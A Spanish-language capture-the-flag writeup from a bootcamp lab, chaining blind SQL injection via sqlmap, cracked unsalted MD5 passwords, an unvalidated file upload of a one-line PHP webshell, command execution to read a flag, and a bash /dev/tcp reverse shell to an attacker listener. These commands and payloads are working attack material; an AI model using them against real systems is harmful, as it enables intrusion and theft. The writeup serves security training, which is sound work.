# Reto Avengers — Writeup

**Plataforma:** Laboratorio Bootcamp (The Bridge)
**Tipo de prueba:** Black-box
**Dificultad:** Media-Alta
**Fecha:** Mayo 2026
**Metodología:** OWASP Testing Guide v4.2 · PTES
**Riesgo global:** CRÍTICO — CVSS v3.1 máx. 10.0

---

## Resumen

Auditoría ofensiva sobre la aplicación web `losvengadores.com` (IP `10.0.0.23`). Partiendo de acceso externo sin credenciales, se encadenaron ocho vulnerabilidades hasta obtener RCE y una shell interactiva como `www-data`.

**Herramientas:** `nmap` · `gobuster` · `sqlmap` · `curl` · `netcat` · `CrackStation`

---

## Cadena de explotación

```
Recon (nmap)
  → Enum web (gobuster)
    → SQL Injection ciega (sqlmap)
      → Hash cracking (CrackStation)
        → Login panel
          → File Upload sin validación
            → RCE (webshell PHP)
              → Reverse Shell (nc 4444)
```

---

## 1. Reconocimiento — Nmap

```bash
nmap -sV 10.0.0.23 -A
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/TCP | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/TCP | HTTP | Apache 2.4.29 (Ubuntu) |

Servidor con Virtual Hosting. Se añadió entrada en `/etc/hosts`:
```
10.0.0.23   losvengadores.com
```

---

## 2. Enumeración web — Gobuster

```bash
gobuster dir -u http://losvengadores.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak -t 50
```

| Recurso | HTTP | Observación |
|---------|------|-------------|
| `buscador.php` | 200 | Vector SQLi |
| `search.php` | 200 | Endpoint AJAX |
| `CV-upload.php` | 200 | Subida de archivos |
| `index.php` | 302 | Panel de login |

---

## 3. Análisis de código fuente

Revisión de `index.html` reveló script `cv_upload.min.js` activo con peticiones POST a `CV-upload.php` aunque el formulario estaba comentado en el HTML. Endpoint activo y explotable (CWE-540).

---

## 4. SQL Injection — sqlmap

Pruebas manuales en `search.php` mostraron comportamiento diferencial ante distintos payloads (Blind SQLi). Automatización:

```bash
sqlmap -u "http://losvengadores.com/search.php" \
  --data="searchVal=thor" \
  --dbs --batch --level=5 --risk=3 \
  --technique=BEUST --dbms=mysql
```

**Credenciales extraídas:**

| Usuario | Hash MD5 | Password |
|---------|----------|----------|
| `capitanamerica` | `6f2f0046...` | `adamantium` |
| `thor` | `fcc8c10b...` | `guapeton` |

Hashes MD5 sin sal crackeados con CrackStation (CWE-916).

---

## 5. Acceso al panel de control

Con `capitanamerica / adamantium` se obtuvo acceso a `PanelControl.php`. Cookies `AVSession` y `PHPSESSID` guardadas para peticiones autenticadas.

---

## 6. File Upload — webshell PHP

El endpoint `CV-upload.php` no validaba tipo MIME ni extensión (CWE-434):

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

curl -X POST http://losvengadores.com/CV-upload.php \
  -b cookies.txt -F "cv=@/tmp/shell.php" -v
# Respuesta: Se ha subido el fichero: xtry/uploads/shell.php
```

---

## 7. RCE y obtención de flag

```bash
curl "http://losvengadores.com/xtry/uploads/shell.php?cmd=whoami"
# www-data

curl "http://losvengadores.com/xtry/uploads/shell.php?cmd=cat+/home/ubuntu/flag.txt"
# Avengers,Assemble!
```

---

## 8. Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Desde webshell
curl "http://losvengadores.com/xtry/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.1.221/4444+0>%261'"
```

Shell interactiva obtenida como `www-data`.

---

## Flag

```
Avengers,Assemble!
```

---

## Vulnerabilidades identificadas

| Hallazgo | Criticidad | CVSS | CWE | OWASP |
|----------|-----------|------|-----|-------|
| Puertos expuestos | Media | 4.3 | CWE-200 | A05:2021 |
| Recursos sin autenticación | Alta | 7.5 | CWE-548 | A05:2021 |
| Código fuente expuesto | Alta | 7.5 | CWE-540 | A05:2021 |
| SQL Injection ciega | Crítica | 9.8 | CWE-89 | A03:2021 |
| MD5 sin sal | Crítica | 9.1 | CWE-916 | A02:2021 |
| File Upload sin validación | Crítica | 9.8 | CWE-434 | A04:2021 |
| RCE via webshell | Crítica | 10.0 | CWE-78 | A03:2021 |
| Reverse shell | Crítica | 10.0 | CWE-78 | A03:2021 |

---

## Lecciones aprendidas

- Vulnerabilidades encadenadas producen impacto exponencial: SQLi + file upload sin validación escala directamente a RCE completo.
- MD5 sin sal es trivialmente crackeable en segundos con diccionario público.
- Endpoints activos referenciados en JavaScript son superficie de ataque aunque el formulario HTML esté comentado.
- El análisis manual de código fuente antes de lanzar herramientas automáticas revela vectores que los scanners pasan por alto.
